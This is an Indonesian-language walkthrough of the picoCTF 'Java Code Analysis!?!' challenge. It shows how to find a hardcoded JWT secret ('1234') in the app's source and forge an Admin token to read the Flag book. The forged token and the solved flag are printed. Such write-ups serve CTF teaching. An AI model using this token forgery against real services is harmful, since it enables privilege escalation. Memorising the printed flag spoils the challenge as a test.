# Java Code Analysis!?!
- Link: https://play.picoctf.org/practice/challenge/355?category=1&page=4

## Tantangan
BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Additional details will be available after launching your challenge instance.

## Penyelesaian
- Tekan tombol **Launch Instance** untuk memulai tantangan

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%201.JPG)

- Buka URL http://saturn.picoctf.net:63867/ di browser

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%202.JPG)

- Login dengan menggunakan username `user` dan password `user`

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%204.JPG)

- Klik kanan halaman lalu pilih **Inspect**

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%205.JPG)

- Pergi ke tab **Storage**

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%206.JPG)

- Double klik value **auth-token** untuk mengcopy jwt token
```sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTcwODU3NTExNiwiaWF0IjoxNzA3OTcwMzE2LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.b19SOCP4Av-LRDwqNdYZ_z8O_43mPwDparuA8zZ3UEI
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%207.JPG)

- Buka web https://jwt.io/ di tab baru lalu paste di field **Encoded**

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%208.JPG)

- Disini kita memerlukan secret untuk signature. Jadi kita perlu mengunduh source code aplikasi tersebut
```sh
wget https://artifacts.picoctf.net/c/483/bookshelf-pico.zip
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%209.JPG)

- Unzip file `bookshelf-pico.zip`
```sh
unzip bookshelf-pico.zip -d bookshelf
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2010.JPG)

- Cari file yang mengandung JWT
```sh
cd bookshelf
grep -R jwt
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2011.JPG)

- Di file `JwtService.java` terdapat variabel `SECRET_KEY`
```sh
mousepad src/main/java/io/github/nandandesai/pico/security/JwtService.java
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2012.JPG)

- Sekarang kita cari file yang mengandung secret
```sh
grep -R secret
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2013.JPG)

- Di file `SecretGenerator.java` terdapat random string `1234`
```sh
mousepad src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2014.JPG)

- Kembali ke halaman web https://jwt.io/ sebelumnya, ubah role menjadi `Admin`, userId menjadi `2` dan email menjadi `admin`

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2015.JPG)

- Masukkan secret `1234` pada bagian verify signature

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2016.JPG)

- Copy JWT token baru yang tergenerate di field **Encoded**
```sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3MDg1NzUxMTYsImlhdCI6MTcwNzk3MDMxNiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.9F1zxX2zWY6N3sxPRy_BprirOEI_FALzgPI1mBGDLv4
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2017.JPG)

- Kembali ke web http://saturn.picoctf.net:63867/ ubah value token `auth-token` dengan token JWT diatas dan token payload menjadi sebagai berikut
```sh
{"role":"Admin","iss":"bookshelf","exp":1708575116,"iat":1707970316,"userId":2,"email":"admin"}
```

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2018.JPG)

- Refresh halaman

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2019.JPG)

- Klik gambar tulisan FLAG

![alt text](https://github.com/rahardian-dwi-saputra/picoCTF-writeup/blob/main/Web%20Exploitations/Java%20Code%20Analysis/assets/java%20code%20analysis%2020.JPG)

- Flag
```sh
picoCTF{w34k_jwt_n0t_g00d_42f5774a}
```